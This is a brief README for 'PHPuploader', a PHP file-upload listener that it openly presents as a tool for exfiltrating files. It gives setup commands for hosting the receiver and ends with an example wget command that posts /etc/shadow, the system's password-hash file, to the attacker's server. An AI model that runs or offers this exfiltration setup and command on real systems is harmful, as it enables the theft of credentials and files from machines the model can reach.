# PHPuploader
 Upload/exfiltrate files.

# Usage
Host "upload.php" on the server.
```
php -S 127.0.0.1:8080 -t .
```
Create "upload" directory and configure.
```
mkdir upload
```
Set (only write) permissions to folder.
```
cd upload && umask 555
```
Additionally, you can change ownership of the folder.
```
useradd dummy && chown dummy upload
```
Example method for posting file to server.
```
wget --post-file=/etc/shadow <server_ip>/upload.php?name=shadow
```






 